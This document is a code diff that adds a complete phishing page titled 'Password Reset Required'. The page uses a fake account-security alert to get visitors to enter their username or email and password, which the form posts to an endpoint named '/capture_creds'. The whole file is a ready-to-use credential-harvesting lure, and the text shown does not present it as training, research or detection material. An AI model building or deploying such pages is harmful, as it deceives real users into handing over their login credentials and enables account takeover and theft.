@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Password Reset Required</title>
+    <style>
+        body { font-family: Arial; max-width: 500px; margin: 0 auto; padding: 20px; }
+        .login-box { border: 1px solid #ddd; padding: 20px; border-radius: 5px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { background: #0066cc; color: white; border: none; padding: 10px 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>🔒 Password Reset</h1>
+    <div class="login-box">
+        <p>Your account security has been flagged. Please verify your identity.</p>
+        <form action="/capture_creds" method="POST">
+            <input type="text" name="username" placeholder="Email or Username" required>
+            <input type="password" name="password" placeholder="New Password" required>
+            <button type="submit">Reset Password</button>
+        </form>
+    </div>
+</body>
+</html>
